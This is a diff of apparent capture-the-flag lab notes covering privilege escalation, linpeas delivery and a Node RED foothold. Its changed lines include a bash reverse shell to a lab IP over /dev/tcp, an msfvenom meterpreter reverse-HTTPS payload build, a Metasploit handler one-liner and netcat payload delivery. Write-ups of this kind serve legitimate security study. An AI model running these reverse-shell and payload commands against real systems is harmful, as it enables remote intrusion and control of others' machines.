@@ -21,7 +21,7 @@ Learnt:
 8. Favicons were a larger indication of where I am capable of expanding further intuitively as it boils down too:
 	1. What is in front of you - what can I use to solve X - not what could be in front of you 
 	2. What sticks out on a blank screen with Favicon and response error code.
-9. The power of `nohup`   and `&` 
+9. The power of `nohup`  and `&` 
 10. WILDCARDS in PrivEsc
 11. Linpeas.sh pivot-delivery 
 Beyond Root:
@@ -153,9 +153,9 @@ nc -lvnp 8000
 # call 
 bash -c 'bash -i >& /dev/tcp/10.10.14.132/8002 0>&1' &
 # Beware it does not auto update fields!
-msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.132 LPORT=4444 --platform linux -a x64 -n 200 -e cmd/generic_sh -i 4 -f elf -o rshell
+msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.92 LPORT=4444 -f elf -o met
 
-msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.94; set LPORT 4444; run"
+msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.92; set LPORT 4444; run"
 
 nc -lvnp  9696 < met
 # On Node RED:
